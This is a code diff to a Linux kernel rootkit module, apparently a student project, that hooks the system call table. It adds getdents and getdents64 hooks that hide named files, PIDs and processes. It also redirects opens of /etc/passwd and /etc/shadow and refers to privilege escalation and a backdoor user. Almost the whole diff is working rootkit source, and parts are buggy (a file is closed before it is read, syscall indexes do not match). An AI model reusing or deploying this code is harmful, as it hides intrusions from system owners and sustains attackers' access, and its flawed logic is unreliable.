@@ -38,7 +38,14 @@ MODULE_AUTHOR("Khan, Kleiman, Gao, Song");
 MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
 // max number of targets
-#define NUM_TARGETS 5
+#define NUM_TARGETS 4
+#define BUF_SIZE 128
+
+#define HIDE_FILE "secret"	//You can also hide processes by PID using HIDE_FILE if you want 
+#define HIDE_PID "9999"
+#define HIDE_PROCESS "dummy"
+// You can create a dummy process that runs and does nothing with this command: 
+// perl  -MPOSIX -e '$0="dummy"; pause' &
 
 static unsigned long *sys_call_table; //points to kernel's syscall table
 
@@ -65,15 +72,12 @@ static bool toInject[NUM_TARGETS] = {0};           //array to toggle which targe
 
 asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode) {
   if (strstr(pathname, "/etc/passwd") != NULL) {
-    pr_info("openAt called (open) path:%s,,fd:%d\n", pathname, dirfd);
+    pr_info("openAt called (open) path:%s, fd:%d\n", pathname, dirfd);
     copy_to_user((void *)pathname, "/etc/secretpasswd", strlen("/etc/secretpasswd") + 1);
-    return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
   } else if (strstr(pathname, "/etc/shadow") != NULL) {
     pr_info("/etc/shadow opened\n");
-	  copy_to_user((void *)pathname, "/etc/secretshadow", strlen("/etc/secretshadow") + 1);
-    return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
+    copy_to_user((void *)pathname, "/etc/secretshadow", strlen("/etc/secretshadow") + 1);
   }
-
     return ((typeof(sys_openat) *)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
 }
 
@@ -121,52 +125,145 @@ asmlinkage int totallyReal_kill(pid_t pid, int sig)
 }
 //end privilege escalation code
 
-void injectSyscalls(void)
-{
-    int targetIndex;
-    for (targetIndex = 0; targetIndex < numTargets; targetIndex++)
-    {
-        if (toInject[targetIndex])
-        {
-            pr_info("Starting injection for target %d\n", targetIndex);
+asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
+	// the output of getdents is the number of bytes read
+	int nread;
+	struct linux_dirent *mod_dirp;
 
-            //save original ptr
-            original_syscallPtrs[targetIndex] = (void *)sys_call_table[syscall_names[targetIndex]];
-            pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);
+	nread = ( ( typeof(sys_getdents)* )(original_syscallPtrs[3]) )(fd, dirp, count);
+	if (nread == -1) {
+		pr_info("FAKEGETDENTS: error calling original function \n");
+		return -1;
+	}
+	else {
+		pr_info("FAKEGETDENTS: successfully read getdents");
+	}
 
-            //inject fake ptr
-            CR0_WRITE_UNLOCK({
-                sys_call_table[syscall_names[targetIndex]] = totallyReal_syscallPtrs[targetIndex];
-            });
-            pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);
+	mod_dirp = kvmalloc(nread, GFP_KERNEL);
+	if (mod_dirp == NULL) {
+		pr_info("FAKEGETDENTS: Error");
+		kvfree( mod_dirp );
+		return -1;
+	}
+	
+	copy_from_user( mod_dirp, dirp, nread);
+	
+	long offset = 0;
+	struct linux_dirent *p_dirp, *prev;
+	while( offset < nread) {
+		p_dirp = (void *) mod_dirp + offset;
+		unsigned short p_dirent_len = p_dirp->d_reclen;
+		
+		struct file *f;
+		char buf[BUF_SIZE];
+		int i = 0;
+		for (i = 0; i < 128; i++)
+			buf[i] = 0;
+		char filename[128];
+		get_cmdline_path( filename, p_dirp->d_name);
+		pr_info("FAKEGETDENTS: filename is: %s", filename);
+		f = file_open( filename, O_RDONLY, 0 );
+		if (f != NULL) {
+			pr_info("FAKEGETDENTS: File open success");
+			filp_close(f, NULL);
+			file_read(f, 0, buf, BUF_SIZE - 1);
+			pr_info("FAKEGETDENTS: cmdline is %s", buf);
+		}
+		int is_proc_name_match = 0;
+		if ( strncmp( buf, HIDE_PROCESS, 127 ) == 0 )
+			is_proc_name_match = 1;
 
-            pr_info("Injection complete for target %d\n", targetIndex);
-        }
-        else
-        {
-            pr_info("skipping injection for target %d\n", targetIndex);
-        }
-    }
+		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL 
+					|| is_proc_name_match
+					|| strstr(p_dirp->d_name, HIDE_PID) != NULL ) {
+			if (p_dirp == mod_dirp) {
+				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
+				nread -= p_dirent_len;
+				memmove(mod_dirp, (void *)mod_dirp + p_dirent_len, nread);
+				continue;
+			}
+			prev->d_reclen += p_dirent_len;
+		}
+		else {
+			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
+			prev = p_dirp;
+		}
+		offset += p_dirent_len;
+	}
+	copy_to_user(dirp, mod_dirp, nread);
+	kvfree(mod_dirp);
+	return nread;
 }
 
-void restoreSyscalls(void)
-{
-    int targetIndex;
-    for (targetIndex = 0; targetIndex < numTargets; targetIndex++)
-    {
-        if (toInject[targetIndex])
-        {
-            pr_info("Restoring ptr for target %d\n", targetIndex);
-            CR0_WRITE_UNLOCK({
-                sys_call_table[syscall_names[targetIndex]] = original_syscallPtrs[targetIndex];
-            });
-            pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
-        }
-        else
-        {
-            pr_info("Skipping restoration for target %d\n", targetIndex);
-        }
-    }
+// Equivalent to getdents bot for getdents64
+asmlinkage long totallyReal_getdents64(int fd, struct linux_dirent64 * dirp, unsigned int count) {
+	// the out of getdents is the number of bytes read
+	int nread;
+	struct linux_dirent64 *mod_dirp;
+
+	nread = ( ( typeof(sys_getdents64)* )(original_syscallPtrs[5]) )(fd, dirp, count);
+	if (nread == -1) {
+		pr_info("FAKEGETDENTS: error calling original function \n");
+		return -1;
+	}
+	else {
+		pr_info("FAKEGETDENTS: successfully read getdents");
+	}
+
+	mod_dirp = kvmalloc(nread, GFP_KERNEL);
+	if (mod_dirp == NULL) {
+		pr_info("FAKEGETDENTS: Error");
+		kvfree( mod_dirp );
+		return -1;
+	}
+	
+	copy_from_user( mod_dirp, dirp, nread);
+	
+	int offset = 0;
+	struct linux_dirent64 *p_dirp, *prev;
+	while( offset < nread) {
+		p_dirp = (void *) mod_dirp + offset;
+		unsigned short p_dirent_len = p_dirp->d_reclen;
+		
+		struct file *f;
+		char buf[BUF_SIZE];
+		int i = 0;
+		for (i = 0; i < 128; i++)
+			buf[i] = 0;
+		char filename[128];
+		get_cmdline_path( filename, p_dirp->d_name);
+		pr_info("FAKEGETDENTS: filename is: %s", filename);
+		f = file_open( filename, O_RDONLY, 0 );
+		if (f != NULL) {
+			pr_info("FAKEGETDENTS: File open success");
+			filp_close(f, NULL);
+			file_read(f, 0, buf, BUF_SIZE - 1);
+			pr_info("FAKEGETDENTS: cmdline is %s", buf);
+		}
+		int is_proc_name_match = 0;
+		if ( strncmp( buf, HIDE_PROCESS, 127 ) == 0 )
+			is_proc_name_match = 1;
+
+		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL 
+					|| is_proc_name_match
+					|| strstr(p_dirp->d_name, HIDE_PID) != NULL ) {
+			if (p_dirp == mod_dirp) {
+				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
+				nread -= p_dirent_len;
+				memmove(mod_dirp, (void *)mod_dirp + p_dirent_len, nread);
+				continue;
+			}
+			prev->d_reclen += p_dirent_len;
+		}
+		else {
+			pr_info("FAKEGETDENTS: normal file '%s'\n", p_dirp->d_name);
+			prev = p_dirp;
+		}
+		offset += p_dirent_len;
+	}
+	copy_to_user(dirp, mod_dirp, nread);
+	kvfree(mod_dirp);
+	return nread;
 }
 
 /**
@@ -236,6 +333,90 @@ void remove_backdoor_user(void)
     return;
 }
 
+struct file * file_open(const char * path, int flags, int rights) {
+	struct file *filp = NULL;
+	mm_segment_t oldfs;
+	int err = 0;
+	oldfs = get_fs();
+	set_fs(get_ds());
+	filp = filp_open(path, flags, rights);
+	set_fs(oldfs);
+	if (IS_ERR(filp)) {
+		err = PTR_ERR(filp);
+		return NULL;
+	}
+	return filp;
+}
+
+int file_read(struct file *f, unsigned long long offset, unsigned char *data, unsigned int size) {
+	mm_segment_t oldfs;
+	int result;
+	
+	oldfs = get_fs();
+	set_fs(get_ds());
+	result = vfs_read( f, data, size, &offset);
+	set_fs(oldfs);
+	return result;
+}
+
+char * get_cmdline_path(char * buf, char * pid) {
+	int i = 0;
+	for (i = 0; i < BUF_SIZE; i++)
+		buf[i] = 0;
+	strcat( buf, "/proc/" );
+	strcat( buf, pid);
+	strcat( buf, "/cmdline" );
+	return buf;
+}
+
+void injectSyscalls(void)
+{
+    int targetIndex;
+    for (targetIndex = 0; targetIndex < numTargets; targetIndex++)
+    {
+        if (toInject[targetIndex])
+        {
+            pr_info("Starting injection for target %d\n", targetIndex);
+
+            //save original ptr
+            original_syscallPtrs[targetIndex] = (void *)sys_call_table[syscall_names[targetIndex]];
+            pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);
+
+            //inject fake ptr
+            CR0_WRITE_UNLOCK({
+                sys_call_table[syscall_names[targetIndex]] = totallyReal_syscallPtrs[targetIndex];
+            });
+            pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);
+
+            pr_info("Injection complete for target %d\n", targetIndex);
+        }
+        else
+        {
+            pr_info("skipping injection for target %d\n", targetIndex);
+        }
+    }
+}
+
+void restoreSyscalls(void)
+{
+    int targetIndex;
+    for (targetIndex = 0; targetIndex < numTargets; targetIndex++)
+    {
+        if (toInject[targetIndex])
+        {
+            pr_info("Restoring ptr for target %d\n", targetIndex);
+            CR0_WRITE_UNLOCK({
+                sys_call_table[syscall_names[targetIndex]] = original_syscallPtrs[targetIndex];
+            });
+            pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
+        }
+        else
+        {
+            pr_info("Skipping restoration for target %d\n", targetIndex);
+        }
+    }
+}
+
 int __init loadMod(void)
 {
     // create the fake file and backdoor files
@@ -255,24 +436,21 @@ int __init loadMod(void)
 
     // FOR EACH NEW SYS CALL you must...
     // increment numTargets, thus obtaining a free index. Then using said index:
-    
-    syscall_names[0] = __NR_read;                           //store the syscall name (is macro for index in sys_call_table)
-    totallyReal_syscallPtrs[0] = (void *)&totallyReal_read; //store the ptr to your fake function
-    toInject[0] = 0;                                        //set whether or not you want to inject your fake function.
+    syscall_names[0] = __NR_openat;                           	//store the syscall name (is macro for index in sys_call_table)
+    totallyReal_syscallPtrs[0] = (void *)&totallyReal_openat;	//store the ptr to your fake function
+    toInject[0] = 1;                                        	//set whether or not you want to inject your fake function.
 
-    syscall_names[1] = __NR_openat;
-    totallyReal_syscallPtrs[1] = (void *)&totallyReal_openfat;
+    syscall_names[1] = __NR_kill;
+    totallyReal_syscallPtrs[1] = (void *)&totallyReal_kill;
     toInject[1] = 1;
 
-    syscall_names[2] = __NR_mkdir;
-    totallyReal_syscallPtrs[2] = (void *)&totallyReal_mkdir;
+    syscall_names[2] = __NR_getdents;
+    totallyReal_syscallPtrs[2] = (void *)&totallyReal_getdents;
     toInject[2] = 1;
-
-    toInject[3] = 0; //getDents intercept is using targetIndex 3 in other branch
-
-    syscall_names[4] = __NR_kill;
-    totallyReal_syscallPtrs[4] = (void *)&totallyReal_kill;
-    toInject[4] = 1;
+	
+    syscall_names[3] = __NR_getdents64;
+    totallyReal_syscallPtrs[3] = (void *)&totallyReal_getdents64;
+    toInject[3] = 1;
 
     injectSyscalls();
 
